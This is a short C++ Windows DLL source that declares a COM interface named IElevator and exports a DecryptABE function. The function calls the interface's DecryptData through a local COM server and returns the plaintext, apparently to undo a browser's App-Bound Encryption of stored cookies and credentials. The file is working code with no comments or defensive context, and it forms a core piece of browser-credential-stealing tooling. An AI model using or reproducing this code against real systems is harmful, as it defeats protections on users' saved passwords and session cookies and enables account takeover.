#include <windows.h>
#include <objbase.h>

struct __declspec(uuid("708860E0-F641-4cb1-957D-FA2FD964F7BC")) IElevator : public IUnknown {
    virtual HRESULT STDMETHODCALLTYPE DecryptData(const BYTE* cipher, DWORD c_size, BYTE** plain, DWORD* p_size) = 0;
};

extern "C" __declspec(dllexport) int __stdcall DecryptABE(const BYTE* cipher, int cipher_len, char* out_plain, int* out_len) {
    CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    IElevator* pElevator = NULL;
    HRESULT hr = CoCreateInstance(__uuidof(IElevator), NULL, CLSCTX_LOCAL_SERVER, __uuidof(IElevator), (void**)&pElevator);
    int status = -1;
    if (SUCCEEDED(hr)) {
        BYTE* plaintext = NULL;
        DWORD plaintext_size = 0;
        hr = pElevator->DecryptData(cipher, (DWORD)cipher_len, &plaintext, &plaintext_size);
        if (SUCCEEDED(hr)) {
            if ((int)plaintext_size < *out_len) {
                memcpy(out_plain, plaintext, plaintext_size);
                *out_len = (int)plaintext_size;
                status = 0; 
            }
            CoTaskMemFree(plaintext);
        } else { status = (int)hr; }
        pElevator->Release();
    }
    CoUninitialize();
    return status;
}